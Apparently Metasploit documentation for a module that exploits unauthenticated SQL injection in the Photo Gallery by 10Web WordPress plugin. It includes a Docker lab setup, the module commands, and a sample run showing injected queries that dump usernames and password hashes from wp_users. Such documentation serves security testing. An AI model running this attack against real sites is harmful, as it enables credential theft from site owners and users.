## Vulnerable Application

The vulnerability affects the **Photo Gallery by 10Web** plugin for WordPress, versions **up to 1.6.0**,
allowing **unauthenticated SQL injection** via the `bwg_tag_id_bwg_thumbnails_0[]` parameter
on `admin-ajax.php` (action=`bwg_frontend_data`). WordPress itself must be installed.

### Pre-requisites

* **Docker** and **Docker Compose** installed.


## Setup Instructions

1. **Create a `docker-compose.yml`** with:

```yaml
version: '3.1'

   services:
     wordpress:
       image: wordpress:latest
       restart: always
       ports:
         - 5555:80
       environment:
         WORDPRESS_DB_HOST: db
         WORDPRESS_DB_USER: chocapikk
         WORDPRESS_DB_PASSWORD: dummy_password
         WORDPRESS_DB_NAME: exploit_market
       mem_limit: 512m
       volumes:
         - wordpress:/var/www/html

     db:
       image: mysql:5.7
       restart: always
       environment:
         MYSQL_DATABASE: exploit_market
         MYSQL_USER: chocapikk
         MYSQL_PASSWORD: dummy_password
         MYSQL_RANDOM_ROOT_PASSWORD: '1'
       volumes:
         - db:/var/lib/mysql

   volumes:
     wordpress:
     db:
```

2. **Start the environment**

```bash
docker-compose up -d
```

3. **Install Photo Gallery plugin**

```bash
wget https://downloads.wordpress.org/plugin/photo-gallery.1.5.82.zip
unzip photo-gallery.1.5.82.zip
docker cp photo-gallery wordpress:/var/www/html/wp-content/plugins/
```

4. **Activate Photo Gallery**

* Browse to `http://localhost:5555/wp-admin`, log in as admin (create one if needed), and activate **Photo Gallery by 10Web**.
* Create a gallery.


## Verification Steps

1. **Launch Metasploit**

```bash
msfconsole
```

2. **Load the Photo Gallery SQLi scanner**

```bash
use auxiliary/gather/wp_photo_gallery_sqli
set RHOSTS 127.0.0.1
set RPORT 5555
set TARGETURI /
```

3. **Run the module**

```bash
run
```

4. **Observe output**

The module should:

* Retrieve the database name
* Enumerate tables and infer the `wp_users` table
* Extract `user_login:user_pass` for the number of rows set by `COUNT`

## Options

### COUNT

Number of user rows to retrieve (default: 5)

## Scenarios

```bash
msf6 auxiliary(gather/wp_photo_gallery_sqli) > run http://lab:5555
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] {SQLi} Executing (select 'nI5hKye')
[*] {SQLi} Encoded to (select 0x6e4935684b7965)
[+] The target is vulnerable.
[*] {SQLi} Executing (SELECT 16 FROM information_schema.tables WHERE table_name = 'wp_users')
[*] {SQLi} Encoded to (SELECT 16 FROM information_schema.tables WHERE table_name = 0x77705f7573657273)
[*] {WPSQLi} Retrieved default table prefix: 'wp_'
[*] {SQLi} Executing (select group_concat(sLt) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) sLt from wp_users limit 1) KVgXfyYs)
[*] {SQLi} Encoded to (select group_concat(sLt) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x7b,0)),ifnull(user_pass,repeat(0x14,0))) as binary) sLt from wp_users limit 1) KVgXfyYs)
[!] No active DB -- Credential data will not be saved!
[+] {WPSQLi} Credential for user 'chocapikk' created successfully.
[*] {WPSQLi} Dumped user data:
wp_users
========

    user_login  user_pass
    ----------  ---------
    chocapikk   $wp$2y$10$Lw9VAfqDMbi9md2Y0945TO4l0NTKJxxXTd3CDTr8gIkgDbBQ2mUgS

[+] Loot saved to: /home/chocapikk/.msf4/loot/20250710131832_default_127.0.0.1_wordpress.users_427582.txt
[*] {WPSQLi} Reporting host...
[*] {WPSQLi} Reporting service...
[*] {WPSQLi} Reporting vulnerability...
[+] {WPSQLi} Reporting completed successfully.
[*] Auxiliary module execution completed
```
